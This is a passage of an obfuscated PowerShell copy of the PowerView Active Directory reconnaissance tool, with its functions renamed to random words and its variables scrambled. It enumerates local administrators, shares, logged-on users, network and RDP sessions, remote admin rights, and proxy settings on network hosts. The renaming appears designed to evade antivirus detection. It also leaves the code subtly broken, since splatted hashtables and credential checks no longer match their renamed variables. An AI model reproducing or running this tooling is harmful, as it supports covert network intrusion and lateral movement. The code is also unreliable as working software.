            $qbMTjYnI99['Identity'] = '*'
        }
        elseif ($ytspMbGK99 -eq 'Domain') {
            $qbMTjYnI99['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($ytspMbGK99 -eq 'DomainController') -or ($ytspMbGK99 -eq 'DC')) {
            $qbMTjYnI99['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $qbMTjYnI99['Identity'] = $ytspMbGK99
        }
        $OIWdXefd99 = Tahitians @SearcherArguments
        ForEach ($GPO in $OIWdXefd99) {
            $RIjrCcMN99 = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
            $KEoKYJky99 =  @{
                'GptTmplPath' = $RIjrCcMN99
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $KEoKYJky99['Credential'] = $QWHERWHL99 }
            Mexicans @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                $_
            }
        }
    }
}
function carfare {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = $Env:COMPUTERNAME,
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $nFyaxSAK99 = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
        }
    }
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            if ($nFyaxSAK99 -eq 'API') {
                $thQQmqke99 = 1
                $WqERlVcn99 = [IntPtr]::Zero
                $EuMBIDCQ99 = 0
                $bzAaPewG99 = 0
                $uzNNYhwR99 = 0
                $yBCCHOLl99 = $ihwNTVTr99::NetLocalGroupEnum($UEyZXQpH99, $thQQmqke99, [ref]$WqERlVcn99, -1, [ref]$EuMBIDCQ99, [ref]$bzAaPewG99, [ref]$uzNNYhwR99)
                $xPNHlFSC99 = $WqERlVcn99.ToInt64()
                if (($yBCCHOLl99 -eq 0) -and ($xPNHlFSC99 -gt 0)) {
                    $PCXsuPYR99 = $KPgEKbKj99::GetSize()
                    for ($i = 0; ($i -lt $EuMBIDCQ99); $i++) {
                        $xuZeUKFb99 = New-Object System.Intptr -ArgumentList $xPNHlFSC99
                        $Info = $xuZeUKFb99 -as $KPgEKbKj99
                        $xPNHlFSC99 = $xuZeUKFb99.ToInt64()
                        $xPNHlFSC99 += $PCXsuPYR99
                        $TVYfdCKC99 = New-Object PSObject
                        $TVYfdCKC99 | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
                        $TVYfdCKC99 | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $TVYfdCKC99 | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $TVYfdCKC99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $TVYfdCKC99
                    }
                    $Null = $ihwNTVTr99::NetApiBufferFree($WqERlVcn99)
                }
                else {
                    Write-Verbose "[carfare] Error: $(([ComponentModel.Win32Exception] $yBCCHOLl99).Message)"
                }
            }
            else {
                $xMLFMEpx99 = [ADSI]"WinNT://$UEyZXQpH99,computer"
                $xMLFMEpx99.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $TVYfdCKC99 = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
                    $Group | Add-Member Noteproperty 'GroupName' ($TVYfdCKC99.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($TVYfdCKC99.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($TVYfdCKC99.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($THMRkorV99) {
            mucilage -sdyalGJn99 $THMRkorV99
        }
    }
}
function madden {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = $Env:COMPUTERNAME,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $PnKWBocM99 = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $nFyaxSAK99 = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
        }
    }
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            if ($nFyaxSAK99 -eq 'API') {
                $thQQmqke99 = 2
                $WqERlVcn99 = [IntPtr]::Zero
                $EuMBIDCQ99 = 0
                $bzAaPewG99 = 0
                $uzNNYhwR99 = 0
                $yBCCHOLl99 = $ihwNTVTr99::NetLocalGroupGetMembers($UEyZXQpH99, $PnKWBocM99, $thQQmqke99, [ref]$WqERlVcn99, -1, [ref]$EuMBIDCQ99, [ref]$bzAaPewG99, [ref]$uzNNYhwR99)
                $xPNHlFSC99 = $WqERlVcn99.ToInt64()
                $LpDVgkcD99 = @()
                if (($yBCCHOLl99 -eq 0) -and ($xPNHlFSC99 -gt 0)) {
                    $PCXsuPYR99 = $TPxWVUvd99::GetSize()
                    for ($i = 0; ($i -lt $EuMBIDCQ99); $i++) {
                        $xuZeUKFb99 = New-Object System.Intptr -ArgumentList $xPNHlFSC99
                        $Info = $xuZeUKFb99 -as $TPxWVUvd99
                        $xPNHlFSC99 = $xuZeUKFb99.ToInt64()
                        $xPNHlFSC99 += $PCXsuPYR99
                        $nkSOUgNR99 = ''
                        $exPXyXLO99 = $hAwLTjYU99::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$nkSOUgNR99);$TmohuzND99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($exPXyXLO99 -eq 0) {
                            Write-Verbose "[madden] Error: $(([ComponentModel.Win32Exception] $TmohuzND99).Message)"
                        }
                        else {
                            $IZCGoUsG99 = New-Object PSObject
                            $IZCGoUsG99 | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
                            $IZCGoUsG99 | Add-Member Noteproperty 'GroupName' $PnKWBocM99
                            $IZCGoUsG99 | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $IZCGoUsG99 | Add-Member Noteproperty 'SID' $nkSOUgNR99
                            $LkYmlAeK99 = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $IZCGoUsG99 | Add-Member Noteproperty 'IsGroup' $LkYmlAeK99
                            $IZCGoUsG99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $LpDVgkcD99 += $IZCGoUsG99
                        }
                    }
                    $Null = $ihwNTVTr99::NetApiBufferFree($WqERlVcn99)
                    $lDHqtbFc99 = $LpDVgkcD99 | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($lDHqtbFc99) {
                        $lDHqtbFc99 = $lDHqtbFc99.Substring(0, $lDHqtbFc99.LastIndexOf('-'))
                        $LpDVgkcD99 | ForEach-Object {
                            if ($_.SID -match $lDHqtbFc99) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $LpDVgkcD99 | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $LpDVgkcD99
                }
                else {
                    Write-Verbose "[madden] Error: $(([ComponentModel.Win32Exception] $yBCCHOLl99).Message)"
                }
            }
            else {
                try {
                    $soeEQjIq99 = [ADSI]"WinNT://$UEyZXQpH99/$PnKWBocM99,group"
                    $soeEQjIq99.psbase.Invoke('Members') | ForEach-Object {
                        $IZCGoUsG99 = New-Object PSObject
                        $IZCGoUsG99 | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
                        $IZCGoUsG99 | Add-Member Noteproperty 'GroupName' $PnKWBocM99
                        $YzwHqQmu99 = ([ADSI]$_)
                        $wKopHNQE99 = $YzwHqQmu99.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $LkYmlAeK99 = ($YzwHqQmu99.SchemaClassName -like 'group')
                        if(([regex]::Matches($wKopHNQE99, '/')).count -eq 1) {
                            $isfESVUZ99 = $True
                            $Name = $wKopHNQE99.Replace('/', '\')
                        }
                        else {
                            $isfESVUZ99 = $False
                            $Name = $wKopHNQE99.Substring($wKopHNQE99.IndexOf('/')+1).Replace('/', '\')
                        }
                        $IZCGoUsG99 | Add-Member Noteproperty 'AccountName' $Name
                        $IZCGoUsG99 | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($YzwHqQmu99.InvokeGet('ObjectSID'),0)).Value)
                        $IZCGoUsG99 | Add-Member Noteproperty 'IsGroup' $LkYmlAeK99
                        $IZCGoUsG99 | Add-Member Noteproperty 'IsDomain' $isfESVUZ99
                        $IZCGoUsG99
                    }
                }
                catch {
                    Write-Verbose "[madden] Error for $UEyZXQpH99 : $_"
                }
            }
        }
    }
    
    END {
        if ($THMRkorV99) {
            mucilage -sdyalGJn99 $THMRkorV99
        }
    }
}
function obligation {
    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
        }
    }
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            $thQQmqke99 = 1
            $WqERlVcn99 = [IntPtr]::Zero
            $EuMBIDCQ99 = 0
            $bzAaPewG99 = 0
            $uzNNYhwR99 = 0
            $yBCCHOLl99 = $ihwNTVTr99::NetShareEnum($UEyZXQpH99, $thQQmqke99, [ref]$WqERlVcn99, -1, [ref]$EuMBIDCQ99, [ref]$bzAaPewG99, [ref]$uzNNYhwR99)
            $xPNHlFSC99 = $WqERlVcn99.ToInt64()
            if (($yBCCHOLl99 -eq 0) -and ($xPNHlFSC99 -gt 0)) {
                $PCXsuPYR99 = $AeITsOke99::GetSize()
                for ($i = 0; ($i -lt $EuMBIDCQ99); $i++) {
                    $xuZeUKFb99 = New-Object System.Intptr -ArgumentList $xPNHlFSC99
                    $Info = $xuZeUKFb99 -as $AeITsOke99
                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $xPNHlFSC99 = $xuZeUKFb99.ToInt64()
                    $xPNHlFSC99 += $PCXsuPYR99
                    $Share
                }
                $Null = $ihwNTVTr99::NetApiBufferFree($WqERlVcn99)
            }
            else {
                Write-Verbose "[obligation] Error: $(([ComponentModel.Win32Exception] $yBCCHOLl99).Message)"
            }
        }
    }
    END {
        if ($THMRkorV99) {
            mucilage -sdyalGJn99 $THMRkorV99
        }
    }
}
function sapped {
    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
        }
    }
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            $thQQmqke99 = 1
            $WqERlVcn99 = [IntPtr]::Zero
            $EuMBIDCQ99 = 0
            $bzAaPewG99 = 0
            $uzNNYhwR99 = 0
            $yBCCHOLl99 = $ihwNTVTr99::NetWkstaUserEnum($UEyZXQpH99, $thQQmqke99, [ref]$WqERlVcn99, -1, [ref]$EuMBIDCQ99, [ref]$bzAaPewG99, [ref]$uzNNYhwR99)
            $xPNHlFSC99 = $WqERlVcn99.ToInt64()
            if (($yBCCHOLl99 -eq 0) -and ($xPNHlFSC99 -gt 0)) {
                $PCXsuPYR99 = $uqtQknjP99::GetSize()
                for ($i = 0; ($i -lt $EuMBIDCQ99); $i++) {
                    $xuZeUKFb99 = New-Object System.Intptr -ArgumentList $xPNHlFSC99
                    $Info = $xuZeUKFb99 -as $uqtQknjP99
                    $ZOXwnwPJ99 = $Info | Select-Object *
                    $ZOXwnwPJ99 | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
                    $ZOXwnwPJ99.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $xPNHlFSC99 = $xuZeUKFb99.ToInt64()
                    $xPNHlFSC99 += $PCXsuPYR99
                    $ZOXwnwPJ99
                }
                $Null = $ihwNTVTr99::NetApiBufferFree($WqERlVcn99)
            }
            else {
                Write-Verbose "[sapped] Error: $(([ComponentModel.Win32Exception] $yBCCHOLl99).Message)"
            }
        }
    }
    END {
        if ($THMRkorV99) {
            mucilage -sdyalGJn99 $THMRkorV99
        }
    }
}
function reigning {
    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
        }
    }
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            $thQQmqke99 = 10
            $WqERlVcn99 = [IntPtr]::Zero
            $EuMBIDCQ99 = 0
            $bzAaPewG99 = 0
            $uzNNYhwR99 = 0
            $yBCCHOLl99 = $ihwNTVTr99::NetSessionEnum($UEyZXQpH99, '', $TEQSWNGN99, $thQQmqke99, [ref]$WqERlVcn99, -1, [ref]$EuMBIDCQ99, [ref]$bzAaPewG99, [ref]$uzNNYhwR99)
            $xPNHlFSC99 = $WqERlVcn99.ToInt64()
            if (($yBCCHOLl99 -eq 0) -and ($xPNHlFSC99 -gt 0)) {
                $PCXsuPYR99 = $bKaekkVH99::GetSize()
                for ($i = 0; ($i -lt $EuMBIDCQ99); $i++) {
                    $xuZeUKFb99 = New-Object System.Intptr -ArgumentList $xPNHlFSC99
                    $Info = $xuZeUKFb99 -as $bKaekkVH99
                    $gCHYbUFe99 = $Info | Select-Object *
                    $gCHYbUFe99 | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
                    $gCHYbUFe99.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $xPNHlFSC99 = $xuZeUKFb99.ToInt64()
                    $xPNHlFSC99 += $PCXsuPYR99
                    $gCHYbUFe99
                }
                $Null = $ihwNTVTr99::NetApiBufferFree($WqERlVcn99)
            }
            else {
                Write-Verbose "[reigning] Error: $(([ComponentModel.Win32Exception] $yBCCHOLl99).Message)"
            }
        }
    }
    END {
        if ($THMRkorV99) {
            mucilage -sdyalGJn99 $THMRkorV99
        }
    }
}
function Colonial {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = 'localhost'
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
        }
    }
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            try {
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$iEYVPYCX99")
                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $TEQSWNGN99 = vileness -ObjectSID $_ -ZMAhChio99 'DomainSimple'
                    if ($TEQSWNGN99) {
                        $TEQSWNGN99, $wvZHbMee99 = $TEQSWNGN99.Split('@')
                    }
                    else {
                        $TEQSWNGN99 = $_
                        $wvZHbMee99 = $Null
                    }
                    $UJTTioeu99 = New-Object PSObject
                    $UJTTioeu99 | Add-Member Noteproperty 'ComputerName' "$iEYVPYCX99"
                    $UJTTioeu99 | Add-Member Noteproperty 'UserDomain' $wvZHbMee99
                    $UJTTioeu99 | Add-Member Noteproperty 'UserName' $TEQSWNGN99
                    $UJTTioeu99 | Add-Member Noteproperty 'UserSID' $_
                    $UJTTioeu99.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $UJTTioeu99
                }
            }
            catch {
                Write-Verbose "[Colonial] Error opening remote registry on '$iEYVPYCX99' : $_"
            }
        }
    }
    END {
        if ($THMRkorV99) {
            mucilage -sdyalGJn99 $THMRkorV99
        }
    }
}
function algorithms {
    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
        }
    }
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            $CCVPaSJD99 = $XxKWqUCD99::WTSOpenServerEx($UEyZXQpH99)
            if ($CCVPaSJD99 -ne 0) {
                $wLBdUilA99 = [IntPtr]::Zero
                $eesEqPHG99 = 0
                $yBCCHOLl99 = $XxKWqUCD99::WTSEnumerateSessionsEx($CCVPaSJD99, [ref]1, 0, [ref]$wLBdUilA99, [ref]$eesEqPHG99);$TmohuzND99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                $xPNHlFSC99 = $wLBdUilA99.ToInt64()
                if (($yBCCHOLl99 -ne 0) -and ($xPNHlFSC99 -gt 0)) {
                    $PCXsuPYR99 = $zpmrJJDd99::GetSize()
                    for ($i = 0; ($i -lt $eesEqPHG99); $i++) {
                        $xuZeUKFb99 = New-Object System.Intptr -ArgumentList $xPNHlFSC99
                        $Info = $xuZeUKFb99 -as $zpmrJJDd99
                        $XPHaEYRa99 = New-Object PSObject
                        if ($Info.pHostName) {
                            $XPHaEYRa99 | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                        }
                        else {
                            $XPHaEYRa99 | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
                        }
                        $XPHaEYRa99 | Add-Member Noteproperty 'SessionName' $Info.pSessionName
                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            $XPHaEYRa99 | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            $XPHaEYRa99 | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }
                        $XPHaEYRa99 | Add-Member Noteproperty 'ID' $Info.SessionID
                        $XPHaEYRa99 | Add-Member Noteproperty 'State' $Info.State
                        $XmEGkzJD99 = [IntPtr]::Zero
                        $NCUfjwXQ99 = 0
                        $exPXyXLO99 = $XxKWqUCD99::WTSQuerySessionInformation($CCVPaSJD99, $Info.SessionID, 14, [ref]$XmEGkzJD99, [ref]$NCUfjwXQ99);$bHvcHxRq99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($exPXyXLO99 -eq 0) {
                            Write-Verbose "[algorithms] Error: $(([ComponentModel.Win32Exception] $bHvcHxRq99).Message)"
                        }
                        else {
                            $shIRIVIq99 = $XmEGkzJD99.ToInt64()
                            $iYTlWUcD99 = New-Object System.Intptr -ArgumentList $shIRIVIq99
                            $Info2 = $iYTlWUcD99 -as $zaACcWJa99
                            $sJVxdLuD99 = $Info2.Address
                            if ($sJVxdLuD99[2] -ne 0) {
                                $sJVxdLuD99 = [String]$sJVxdLuD99[2]+'.'+[String]$sJVxdLuD99[3]+'.'+[String]$sJVxdLuD99[4]+'.'+[String]$sJVxdLuD99[5]
                            }
                            else {
                                $sJVxdLuD99 = $Null
                            }
                            $XPHaEYRa99 | Add-Member Noteproperty 'SourceIP' $sJVxdLuD99
                            $XPHaEYRa99.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $XPHaEYRa99
                            $Null = $XxKWqUCD99::WTSFreeMemory($XmEGkzJD99)
                            $xPNHlFSC99 += $PCXsuPYR99
                        }
                    }
                    $Null = $XxKWqUCD99::WTSFreeMemoryEx(2, $wLBdUilA99, $eesEqPHG99)
                }
                else {
                    Write-Verbose "[algorithms] Error: $(([ComponentModel.Win32Exception] $TmohuzND99).Message)"
                }
                $Null = $XxKWqUCD99::WTSCloseServer($CCVPaSJD99)
            }
            else {
                Write-Verbose "[algorithms] Error opening the Remote Desktop Session Host (RD Session Host) server for: $iEYVPYCX99"
            }
        }
    }
    END {
        if ($THMRkorV99) {
            mucilage -sdyalGJn99 $THMRkorV99
        }
    }
}
function neoclassicism {
    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
        }
    }
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            $CCVPaSJD99 = $hAwLTjYU99::OpenSCManagerW("\\$UEyZXQpH99", 'ServicesActive', 0xF003F);$TmohuzND99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $JUsiQPqm99 = New-Object PSObject
            $JUsiQPqm99 | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
            if ($CCVPaSJD99 -ne 0) {
                $Null = $hAwLTjYU99::CloseServiceHandle($CCVPaSJD99)
                $JUsiQPqm99 | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[neoclassicism] Error: $(([ComponentModel.Win32Exception] $TmohuzND99).Message)"
                $JUsiQPqm99 | Add-Member Noteproperty 'IsAdmin' $False
            }
            $JUsiQPqm99.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $JUsiQPqm99
        }
    }
    END {
        if ($THMRkorV99) {
            mucilage -sdyalGJn99 $THMRkorV99
        }
    }
}
function handed {
    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
        }
    }
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            if ($UEyZXQpH99 -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $QSFCdieB99 = $UEyZXQpH99
                $UEyZXQpH99 = [System.Net.Dns]::GetHostByAddress($UEyZXQpH99) | Select-Object -ExpandProperty HostName
            }
            else {
                $QSFCdieB99 = @(readjust -iEYVPYCX99 $UEyZXQpH99)[0].IPAddress
            }
            $WqERlVcn99 = [IntPtr]::Zero
            $yBCCHOLl99 = $ihwNTVTr99::DsGetSiteName($UEyZXQpH99, [ref]$WqERlVcn99)
            $ikfEfgot99 = New-Object PSObject
            $ikfEfgot99 | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
            $ikfEfgot99 | Add-Member Noteproperty 'IPAddress' $QSFCdieB99
            if ($yBCCHOLl99 -eq 0) {
                $cgKWGcFU99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($WqERlVcn99)
                $ikfEfgot99 | Add-Member Noteproperty 'SiteName' $cgKWGcFU99
            }
            else {
                Write-Verbose "[handed] Error: $(([ComponentModel.Win32Exception] $yBCCHOLl99).Message)"
                $ikfEfgot99 | Add-Member Noteproperty 'SiteName' ''
            }
            $ikfEfgot99.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')
            $Null = $ihwNTVTr99::NetApiBufferFree($WqERlVcn99)
            $ikfEfgot99
        }
    }
    END {
        if ($THMRkorV99) {
            mucilage -sdyalGJn99 $THMRkorV99
        }
    }
}
function gads {
    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = $Env:COMPUTERNAME,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            try {
                $cneXuwmF99 = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $UEyZXQpH99
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $cneXuwmF99['Credential'] = $QWHERWHL99 }
                $IpbKPeNh99 = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'
                $HKCU = 2147483649
                $VAhyRDYd99 = $IpbKPeNh99.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                $zehPJpZi99 = $IpbKPeNh99.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue
                $Wpad = ''
                if ($zehPJpZi99 -and ($zehPJpZi99 -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($zehPJpZi99)
                    }
                    catch {
                        Write-Warning "[gads] Error connecting to AutoConfigURL : $zehPJpZi99"
                    }
                }
                if ($VAhyRDYd99 -or $zehPJpZi99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
                    $Out | Add-Member Noteproperty 'ProxyServer' $VAhyRDYd99
                    $Out | Add-Member Noteproperty 'AutoConfigURL' $zehPJpZi99
                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $Out
                }
                else {
                    Write-Warning "[gads] No proxy settings found for $iEYVPYCX99"
                }
            }
            catch {
                Write-Warning "[gads] Error enumerating proxy settings for $iEYVPYCX99 : $_"
            }
        }
    }
}
function fills {
    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            $HKLM = 2147483650
            $cneXuwmF99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $UEyZXQpH99
                'ErrorAction' = 'SilentlyContinue'
            }
